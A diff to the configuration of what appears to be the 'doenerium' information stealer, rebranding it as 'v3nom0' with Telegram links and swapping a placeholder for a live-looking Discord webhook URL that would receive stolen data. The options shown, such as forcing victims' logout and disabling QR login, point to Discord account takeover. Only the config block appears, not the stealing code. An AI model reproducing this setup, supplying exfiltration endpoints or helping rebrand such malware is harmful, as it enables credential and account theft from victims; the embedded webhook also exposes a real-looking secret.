@@ -11,9 +11,9 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "doenerium",
+    brand: "v3nom0",
 
-    webhook: "REPLACE_ME",
+    webhook: "https://discordapp.com/api/webhooks/1164566609931812901/wMPZqxvjiA_L6mOlshMHXoSp8fe8zY9Kk_8KG52MEsIDeEYFpg8V4sK3AfHuNw7kPprN",
 
     logout: true,
     disable_qr_code: true,
@@ -23,12 +23,12 @@ var config = {
     ping: [true, "@doener"],
 
     embed: {
-        username: "doenerium | t.me/doenerium",
+        username: "v3nom0 | t.me/v3nom0",
         footer: {
-            text: `doenerium | t.me/doenerium`,
+            text: `v3nom0 | t.me/v3nom0`,
             icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "https://t.me/doenerium",
+        href: "https://t.me/v3nom0",
         avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
